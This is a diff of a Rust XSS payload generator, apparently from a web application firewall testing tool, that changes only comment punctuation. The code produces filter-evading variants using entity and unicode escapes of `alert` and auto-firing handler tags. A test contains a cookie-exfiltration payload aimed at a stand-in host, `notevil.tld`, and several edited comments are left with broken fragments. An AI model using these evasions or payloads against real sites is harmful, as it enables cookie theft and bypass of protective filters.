@@ -1,5 +1,5 @@
 //! XSS payload-string equivalence + the joint `(payload × delivery)`
-//! generator — the XSS arm of Phase B.
+//! generator (the XSS arm of Phase B).
 //!
 //! Same contract as the SQL generator: every rewrite is
 //! browser-parser-equivalent *by construction* and every emitted
@@ -16,7 +16,7 @@ use crate::grammar::xss::is_structured_xss;
 /// XSS execution function names checked by `still_executes_xss` for PoC attacks.
 const XSS_EXEC_KEYWORDS: &[&str] = &["alert", "confirm", "prompt", "eval", "print"];
 
-/// HTML "before/after attribute name" separators — all parsed
+/// HTML "before/after attribute name" separators, all parsed
 /// identically by the HTML tokenizer. `/` is a legal attribute
 /// separator (`<svg/onload=…>` ≡ `<svg onload=…>`).
 const HTML_WS: &[&str] = &[
@@ -29,7 +29,7 @@ fn ws_pick(rng: &mut Rng) -> String {
 
 // ── soundness ──────────────────────────────────────────────────────
 
-/// Lowercased, HTML-entity-`&#xNN;`/`&#NN;`-decoded copy — what the
+/// Lowercased, HTML-entity-`&#xNN;`/`&#NN;`-decoded copy, what the
 /// browser effectively sees, so entity-evasions normalise back.
 fn normalize(s: &str) -> String {
     let mut out = String::with_capacity(s.len());
@@ -164,16 +164,16 @@ fn has_exec_context(lc: &str) -> bool {
 }
 
 /// True iff a JS sink in this payload sits where the HTML parser DECODES
-/// `&#…;` entities before the JS engine runs — i.e. an event-handler
+/// `&#…;` entities before the JS engine runs, i.e. an event-handler
 /// ATTRIBUTE value. Inside a `<script>` raw-text element entities are NOT
 /// decoded (`&#x61;lert` is a JS syntax error, never `alert`), and
 /// `normalize`/`still_executes_xss` decode entities BLINDLY and cannot
-/// tell the two apart — so THIS generator-side guard is the sole
+/// tell the two apart, so THIS generator-side guard is the sole
 /// soundness mechanism for HTML-entity rewrites. Deliberately
 /// conservative: requires an `on*=` handler and NO `<script` anywhere, so
 /// a script-body sink is never entity-encoded. (A `javascript:`/`srcdoc`
 /// value would also be safe, but is left out rather than risk an
-/// edge-case misjudgement — soundness over reach.)
+/// edge-case misjudgement, soundness over reach.)
 fn entity_attr_context(s: &str) -> bool {
     let lc = s.to_ascii_lowercase();
     !lc.contains("<script") && has_on_handler(&lc)
@@ -198,7 +198,7 @@ pub fn still_executes_xss(original: &str, cand: &str) -> bool {
         // token, not buried in a longer alphanumeric run. The prior
         // `lc.contains(t)` substring check let a marker survive inside a
         // different identifier/host: `fetch(` "preserved" by `prefetch(`,
-        // exfil host `evil.com` by `notevil.com` / `evil.community` — none of
+        // exfil host `evil.com` by `notevil.com` / `evil.community`: none of
         // which is the original attack. `contains_token` (the shared
         // boundary-aware matcher, §7 DEDUP: one primitive for SQL + XSS) is
         // edge-aware: markers ending in `(` keep matching `fetch(x)`, and a
@@ -393,7 +393,7 @@ fn rw_handler_synonym(payload: &str, rng: &mut Rng) -> Option<String> {
         return None; // not cleanly re-nestable
     }
     // The handler value MUST be quoted with a quote char absent from
-    // the body — an UNQUOTED handler breaks on the first space/`>` in
+    // the body, an UNQUOTED handler breaks on the first space/`>` in
     // the JS, producing a malformed tag that never executes (the
     // verifier substring-matches markers and would wrongly accept it).
     let q = if !body.contains('"') {
@@ -404,14 +404,14 @@ fn rw_handler_synonym(payload: &str, rng: &mut Rng) -> Option<String> {
         return None;
     };
     let qb = format!("{q}{body}{q}");
-    // Every entry must AUTO-fire with EXACTLY the attributes written here —
+    // Every entry must AUTO-fire with EXACTLY the attributes written here 
     // `still_executes_xss` only checks token presence, not real execution, so
     // this list is the sole soundness authority for "this carrier runs on its
     // own." Each below is a load/error/focus handler that fires with no user
     // interaction: `src=x` guarantees the resource fails → `onerror`;
     // `autofocus` drives `onfocus`; `<iframe>`/`<body>`/`<svg>` `onload` fire
     // on (about:blank) load; `<audio src=x onerror>` is the same failed-load
-    // path as `<img>`/`<video>`. NO click/hover/animate-timing carriers — those
+    // path as `<img>`/`<video>`. NO click/hover/animate-timing carriers, those
     // need attributes or interaction the token oracle cannot verify.
     let mut pool: Vec<String> = [
         "<svg onload={V}>",
@@ -449,7 +449,7 @@ fn rw_js_unicode(s: &str, rng: &mut Rng) -> Option<String> {
             if !after.trim_start().starts_with('(') {
                 continue;
             }
-            // F91: was `chance(1, 1)` — that's always-true (`x % 1 < 1`
+            // F91: was `chance(1, 1)`: that's always-true (`x % 1 < 1`
             // ⇒ 0 < 1), so the `continue` was dead and the function
             // emitted the escape on the first sink-name match
             // regardless of seed. That collapsed bypass diversity and
@@ -500,13 +500,13 @@ fn escape_sink_letters(
 }
 
 /// HTML-entity-encode a random subset of a JS sink's letters
-/// (`alert` → `&#x61;lert` or `&#97;lert`) — the classic attribute-context
+/// (`alert` → `&#x61;lert` or `&#97;lert`), the classic attribute-context
 /// evasion. Fires ONLY in an event-handler attribute value
 /// ([`entity_attr_context`]), where the HTML parser decodes the entities
 /// before the JS engine sees the handler; a WAF keyed on the literal sink
 /// is bypassed while the browser still executes `alert(…)`.
 ///
-/// Emits BOTH numeric-entity bases — hex (`&#xNN;`) and decimal (`&#NN;`) —
+/// Emits BOTH numeric-entity bases, hex (`&#xNN;`) and decimal (`&#NN;`) 
 /// chosen per call. `normalize` decodes both (it branches on the `x`/`X`
 /// prefix, lines ~41/50), so `still_executes_xss` confirms equivalence
 /// either way. Decimal is a distinct sound bypass: many WAF signatures key
@@ -614,7 +614,7 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
             s = u;
             rules.push("js_unicode_escape");
         }
-        // HTML-entity sink encoding — attribute-context only (sound guard
+        // HTML-entity sink encoding, attribute-context only (sound guard
         // inside). No-ops if js_unicode already consumed the literal sink.
         if rng.chance(2, 5)
             && let Some(e) = rw_html_entity(&s, &mut rng)
@@ -635,7 +635,7 @@ pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
                 param: cfg.param.clone(),
             }
         };
-        // Skip (don't silently re-route — that would bias the delivery
+        // Skip (don't silently re-route, that would bias the delivery
         // distribution) when this rewrite cannot legally occupy the
         // sampled raw channel. The attempts budget absorbs the misses.
         if !d.transport_legal(&s) {
@@ -692,7 +692,7 @@ mod tests {
     fn structured_marker_buried_in_larger_identifier_is_rejected() {
         // SOUNDNESS regression (R2 §14 introspection: the same substring-
         // containment bug found+fixed in the SQL relation also lived here).
-        // The structured-marker gate used `lc.contains(t)` — raw substring —
+        // The structured-marker gate used `lc.contains(t)`: raw substring 
         // so a candidate that buries each marker inside a LARGER token passed
         // even though the buried text is no longer the attack. Here the exfil
         // markers are `fetch(`, `document.cookie`, and host `evil.tld`.
@@ -700,7 +700,7 @@ mod tests {
         // Candidate keeps a valid exec context (real onerror handler) but
         // every marker is buried: `prefetch(` ⊃ `fetch(`, host `notevil.tld`
         // ⊃ `evil.tld`. `document.cookie` is kept intact so the test isolates
-        // the burial of the OTHER two — a single buried marker must already
+        // the burial of the OTHER two, a single buried marker must already
         // fail the `all(...)`.
         let buried = "<img src=x onerror=prefetch('//notevil.tld/c?'+document.cookie)>";
         assert!(
@@ -734,7 +734,7 @@ mod tests {
 
     #[test]
     fn unicode_escape_normalizes_back_to_the_sink() {
-        // alert ≡ alert at JS parse — normaliser must fold it.
+        // alert ≡ alert at JS parse (normaliser must fold it).
         assert!(normalize("\\u0061lert(1)").contains("alert(1)"));
         assert!(still_executes_xss(
             "<svg onload=alert(1)>",
@@ -744,7 +744,7 @@ mod tests {
 
     #[test]
     fn multi_char_unicode_escape_is_equivalent_and_emitted() {
-        // EVERY letter of the sink escaped must still execute — normalize has
+        // EVERY letter of the sink escaped must still execute, normalize has
         // to decode the consecutive `\uXXXX` runs back to `alert`.
         assert!(normalize("\\u0061\\u006c\\u0065\\u0072\\u0074(1)").contains("alert(1)"));
         assert!(still_executes_xss(
@@ -780,7 +780,7 @@ mod tests {
         // attribute value but NOT inside a `<script>` body, where
         // `&#x61;lert` is a JS syntax error, never `alert`. normalize()
         // decodes entities blindly, so `still_executes_xss` would WRONGLY
-        // accept a script-body entity form — the generator's
+        // accept a script-body entity form, the generator's
         // `entity_attr_context` guard is the only thing keeping it sound.
         // Demonstrate the blind spot, then prove the guard closes it.
         assert!(
@@ -795,7 +795,7 @@ mod tests {
             let mut rng = Rng::new(seed);
             assert!(
                 rw_html_entity(script_body, &mut rng).is_none(),
-                "entity-encoded a <script>-body sink (seed {seed}) — would not execute"
+                "entity-encoded a <script>-body sink (seed {seed}), would not execute"
             );
         }
         // In an event-handler attribute it fires and stays equivalent.
@@ -867,7 +867,7 @@ mod tests {
         // Oracle-asymmetry close: `normalize` decodes BOTH numeric bases but
         // the generator previously emitted only hex `&#x…;`. Prove a sound
         // DECIMAL form (`&#NN;`, the byte after `&#` is a digit, never `x`)
-        // now appears — a distinct bypass for WAFs keyed on the `&#x` form.
+        // now appears (a distinct bypass for WAFs keyed on the `&#x` form).
         let atk = "<svg onload=alert(1)>";
         let mut saw_decimal = false;
         for seed in 0..120u64 {
